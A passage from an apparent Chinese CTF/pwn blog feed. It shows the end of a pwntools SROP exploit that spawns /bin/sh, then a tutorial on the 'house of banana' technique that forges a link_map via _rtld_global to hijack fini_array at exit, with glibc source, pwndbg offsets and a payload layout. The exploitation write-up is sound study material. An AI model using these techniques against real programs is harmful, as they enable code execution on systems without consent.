/home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">mov_rax_15_ret = <span class="number">0x4004da</span></span><br><span class="line">mov_rax_59_ret = <span class="number">0x4004e2</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">io.recv(<span class="number">0x10</span>)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x118</span></span><br><span class="line">log.info(<span class="string">&quot;stack_addr --&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sigFrame = SigreturnFrame()</span><br><span class="line">sigFrame.rax = <span class="number">59</span></span><br><span class="line">sigFrame.rdi = stack_addr</span><br><span class="line">sigFrame.rsi = <span class="number">0x0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0x0</span></span><br><span class="line">sigFrame.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(mov_rax_15_ret) + p64(syscall_ret) + <span class="built_in">bytes</span>(sigFrame)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> SROP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于house of banana</title>
      <link href="/2025/09/02/%E5%85%B3%E4%BA%8Ehouse-of-banana/"/>
      <url>/2025/09/02/%E5%85%B3%E4%BA%8Ehouse-of-banana/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前脚算是梳理了一下<code>exit</code>的攻击点，想到<code>house of banana</code>是攻击<code>rtld_global</code>结构体，正是对前面梳理的<code>exit</code>攻击点的利用，于是也就记录一下</p><h2 id="0x01-house-of-banana-原理"><a href="#0x01-house-of-banana-原理" class="headerlink" title="0x01 house of banana 原理"></a>0x01 house of banana 原理</h2><p>详细见<a href="https://r3t2.top/2025/08/30/%E5%85%B3%E4%BA%8Eexit%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%BC%80%E5%A7%8B%E5%88%B0%E7%BB%93%E6%9D%9F/">关于exit的利用以及一个程序的开始到结束 | r3t2’s blog</a>中关于<code>_rtld_global</code>结构体攻击点的叙述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global -&gt; _ns_loaded -&gt; link_map -&gt; ((fini_t) array[i]) ()</span><br></pre></td></tr></table></figure><p><code>house of banana</code>的攻击思路大概就是向<code>_rtld_global</code>结构体中的<code>_ns_loaded</code>写入一个堆地址，在堆中伪造出一个<code>link_map</code>结点。有哪些检查呢？把<code>_dl_fini</code>中的检查翻出来（glibc2.35）先是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>这保证了：如果<code>nloaded == 0</code>，则<code>_ns_loaded == NULL</code>；如果<code>_ns_loaded != NULL</code>，则<code>nloaded != 0</code>，就是<code>link_map</code>链表头和链表节点数量的状态的一致性检查，同时发现<code>nloaded</code>不为0以及<code>_ns_loaded</code>为NULL是能通过的，大概因为<code>_ns_loaded</code>都为NULL了，<code>nloaded</code>也没啥意义了。我们总结这不需要我们特地去绕过<br>接着是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>总结一下，要求<code>l == l-&gt;real</code>，其他在我们的攻击中不会设计，同时在<code>_dl_close</code>中我们发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">struct</span> link_map *l = ns-&gt;_ns_loaded; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    &#123;</span><br><span class="line">      l-&gt;l_map_used = <span class="number">0</span>;</span><br><span class="line">      l-&gt;l_map_done = <span class="number">0</span>;</span><br><span class="line">      l-&gt;l_idx = idx;</span><br><span class="line">      maps[idx] = l;</span><br><span class="line">      ++idx;</span><br><span class="line">    &#125;</span><br><span class="line">  assert (idx == nloaded);</span><br></pre></td></tr></table></figure><p>这要求<code>link_map</code>实际结点数必须匹配<code>nloaded</code>，所以我们<code>nloaded</code>最好不修改，且为了方便绕过这个检查，我们直接在<code>link_map</code>链表的第三个结点的<code>l_next</code>写入堆地址来伪造成第四个结点，又或者是我们伪造第一个结点后，将<code>l_next</code>设置为正常情况下的第二个结点，我们这里分析后者（接下来的调试都是<strong>glibc2.35</strong>下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line">$1 = (struct rtld_global *) 0x7ffff7ffd040 &lt;_rtld_global&gt;</span><br><span class="line">pwndbg&gt; tele 0x7ffff7ffd040</span><br><span class="line">00:0000│ r15 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f</span><br><span class="line">01:0008│     0x7ffff7ffd048 (_rtld_global+8) ◂— 4</span><br><span class="line">02:0010│     0x7ffff7ffd050 (_rtld_global+16) —▸ 0x7ffff7ffe5a0 —▸ 0x7ffff7fbb690 —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— ...</span><br><span class="line">03:0018│     0x7ffff7ffd058 (_rtld_global+24) ◂— 0</span><br><span class="line">04:0020│     0x7ffff7ffd060 (_rtld_global+32) —▸ 0x7ffff7fbb160 —▸ 0x7ffff7c00000 ◂— 0x3010102464c457f</span><br><span class="line">05:0028│     0x7ffff7ffd068 (_rtld_global+40) ◂— 0</span><br><span class="line">06:0030│     0x7ffff7ffd070 (_rtld_global+48) ◂— 0</span><br><span class="line">07:0038│     0x7ffff7ffd078 (_rtld_global+56) ◂— 1</span><br></pre></td></tr></table></figure><p>这样查看地址后计算偏移即可，看需要伪造的<code>l_next</code>偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_next)</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe2f8 is 0x18 bytes (0x3 words)</span><br></pre></td></tr></table></figure><p>为<code>0x18</code>，需要填入第二个结点的地址<br>我们看<code>l_real</code>的偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_real)</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe308 is 0x28 bytes (0x5 words)</span><br></pre></td></tr></table></figure><p>为<code>0x28</code>，需要填入我们伪造的堆地址<br>然后是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">  ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">DL_CALL_DT_FINI</span><br><span class="line">  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">  _dl_audit_objclose (l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">      --l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这一段我们抽出检查部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><p>最先是<code>l_init_called</code>的检查，找到其类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br></pre></td></tr></table></figure><p>在结构体里，可以用 冒号 <code>:</code> 指定某个成员只占用若干 <code>bit</code>，这个<code>l_init_called</code>类型为<code>unsigned int</code>，但是只占<code>1bit</code>，<br>理论上设置为<strong>1</strong>即可，稳妥起见我们看一下完整位域</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_global:<span class="number">1</span>;<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_reserved:<span class="number">2</span>;<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_main_map:<span class="number">1</span>;  <span class="comment">/* Nonzero for the map of the main program.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_visited:<span class="number">1</span>;   <span class="comment">/* Used internally for map dependency</span></span><br><span class="line"><span class="comment">   graph traversal.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_map_used:<span class="number">1</span>;  <span class="comment">/* These two bits are used during traversal */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_map_done:<span class="number">1</span>;  <span class="comment">/* of maps in _dl_close_worker. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* Nonzero if the data structure pointed</span></span><br><span class="line"><span class="comment">to by `l_phdr&#x27; is allocated.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_soname_added:<span class="number">1</span>; <span class="comment">/* Nonzero if the SONAME is for sure in</span></span><br><span class="line"><span class="comment">      the l_libname list.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_faked:<span class="number">1</span>;<span class="comment">/* Nonzero if this is a faked descriptor</span></span><br><span class="line"><span class="comment">   without associated file.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_need_tls_init:<span class="number">1</span>; <span class="comment">/* Nonzero if GL(dl_init_static_tls)</span></span><br><span class="line"><span class="comment">       should be called on this link map</span></span><br><span class="line"><span class="comment">       when relocation finishes.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_auditing:<span class="number">1</span>;<span class="comment">/* Nonzero if the DSO is used in auditing.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_audit_any_plt:<span class="number">1</span>; <span class="comment">/* Nonzero if at least one audit module</span></span><br><span class="line"><span class="comment">       is interested in the PLT interception.*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_removed:<span class="number">1</span>;<span class="comment">/* Nozero if the object cannot be used anymore</span></span><br><span class="line"><span class="comment">   since it is removed.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_contiguous:<span class="number">1</span>; <span class="comment">/* Nonzero if inter-segment holes are</span></span><br><span class="line"><span class="comment">    mprotected or if no holes are present at</span></span><br><span class="line"><span class="comment">    all.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* Nonzero if l_local_scope</span></span><br><span class="line"><span class="comment"> during LD_TRACE_PRELINKING=1</span></span><br><span class="line"><span class="comment"> contains any DT_SYMBOLIC</span></span><br><span class="line"><span class="comment"> libraries.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* Nonzero if l_initfini can be</span></span><br><span class="line"><span class="comment">       freed, ie. not allocated with</span></span><br><span class="line"><span class="comment">       the dummy malloc in ld.so.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_ld_readonly:<span class="number">1</span>; <span class="comment">/* Nonzero if dynamic section is readonly.  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l_find_object_processed:<span class="number">1</span>; <span class="comment">/* Zero if _dl_find_object_update</span></span><br><span class="line"><span class="comment">       needs to process this</span></span><br><span class="line"><span class="comment">       lt_library map.  */</span></span><br></pre></td></tr></table></figure><p>这里<code>l_init_called</code>和他附近的<code>unsigned int</code>成员共用四字节，我们无法单独设置其为1，最多单独设置一字节为1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance _rtld_global._dl_ns[0]._ns_loaded  &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe5fc is 0x31c bytes (0x63 words)</span><br><span class="line">pwndbg&gt; p (_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called</span><br><span class="line">$4 = 1</span><br></pre></td></tr></table></figure><p>偏移<code>0x31c</code>，值为<strong>1</strong>，这个偏移是<code>l_init_called</code>所处的<code>unsigned int</code>的偏移，那么在偏移<code>0x31c</code>处设置<code>p8(0x8)</code>即可<br>需要注意的是，这个偏移不同版本可能不一致<br>接着就是我们伪造<code>l_info</code>时候的检查了，此前已经分析过，<code>DT_FINI_ARRAY</code>的值为26，<code>DT_FINI_ARRAYSZ</code>为28，我们修改伪造的<code>link_map</code>结点中的<code>l_info[0x1a]</code>为<code>addrA</code>, 修改<code>l_info[0x1c]</code>为<code>addrB</code>，然后布置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0x1a, addrC)</span><br><span class="line">addrB: flat(0x1c, N)</span><br></pre></td></tr></table></figure><p>也就伪造好了<code>fini_array</code>，<code>addrC</code>写入需要执行的函数（我们设置<code>l_addr</code>为<strong>0</strong>），而这里的<code>N</code>就写需要执行的函数数*8即可。我们看一下偏移方便伪造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26])</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe3f0 is 0x110 bytes (0x22 words)</span><br><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[28])</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe400 is 0x120 bytes (0x24 words)</span><br><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_addr)</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe2e0 is 0x0 bytes (0x0 words)</span><br></pre></td></tr></table></figure><p><code>l_info[26]</code>和<code>l_info[28]</code>分别是<code>0x110</code>和<code>0x120</code>，而<code>l_addr</code>在最开头处。<br>最后总结一下绕过的攻击手法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">向 &amp;_rtld_global写入堆地址chunk_addr</span><br><span class="line">|</span><br><span class="line">设置l_addr == 0; 即 chunk_addr 写入0 (一般不用管都是0，因为是chunk的pre_size字段)</span><br><span class="line">|</span><br><span class="line">恢复l_next为正常情况下的值; 即 chunk_addr+0x18 写入link_map链表第二个结点地址</span><br><span class="line">|</span><br><span class="line">设置l == l_real; 即 chunk_addr+0x28 写入chunk_addr</span><br><span class="line">|</span><br><span class="line">伪造l_info[26]; 即 chunk_addr+0x110 写入chunk_addr+0x40，然后 chunk_addr+0x40 写入0x1a，chunk_addr+0x48 写入chunk_addr+0x58，最后在 chunk_addr+0x58 写入ogg</span><br><span class="line">|</span><br><span class="line">伪造l_info[28]; 即 chunk_addr+0x120 写入chunk_addr+0x60, 然后 chunk_addr+0x60 写入0x1c，chunk_addr+0x68 写入</span><br><span class="line">0x8</span><br><span class="line">|</span><br><span class="line">设置l_init_called; 即 chunk_addr+0x31c 写入1</span><br></pre></td></tr></table></figure><p>最后布局如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">chunk_addr</span><br><span class="line">│</span><br><span class="line">├── [0x000] l_addr = 0   # prev_size域 (可忽略，一般就是0)</span><br><span class="line">│</span><br><span class="line">├── [0x018] l_next = &amp;link_map[2] (示意，第二个结点地址)</span><br><span class="line">|</span><br><span class="line">├── [0x028] l_real = chunk_addr</span><br><span class="line">│</span><br><span class="line">├── [0x040] l_info[26] entry</span><br><span class="line">│       ├── [0x040] tag = 0x1a (DT_FINI_ARRAY)</span><br><span class="line">│       ├── [0x048] val = chunk_addr+0x58</span><br><span class="line">│</span><br><span class="line">├── [0x058] ogg (函数地址)</span><br><span class="line">│</span><br><span class="line">├── [0x060] l_info[28] entry</span><br><span class="line">│       ├── [0x060] tag = 0x1c (DT_FINI_ARRAYSZ)</span><br><span class="line">│       ├── [0x068] val = 0x8 (size)</span><br><span class="line">│</span><br><span class="line">├── [0x110] l_info[26] 指针 = chunk_addr+0x40</span><br><span class="line">├── [0x120] l_info[28] 指针 = chunk_addr+0x60</span><br><span class="line">│</span><br><span class="line">└── [0x31c] l_init_called = 1    </span><br></pre></td></tr></table></figure><p>有时候远程的 <code>_rtld_global</code> 的偏移与本地不一样，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移<br>我们这里其实劫持了<code>fini_array</code>，其实不仅仅可以执行一个函数，而是可以<code>call</code>多次，可以结合<code>setcontext</code>打<code>ROP</code>来进行<code>orw</code></p><h2 id="0x02-动手"><a href="#0x02-动手" class="headerlink" title="0x02 动手"></a>0x02 动手</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 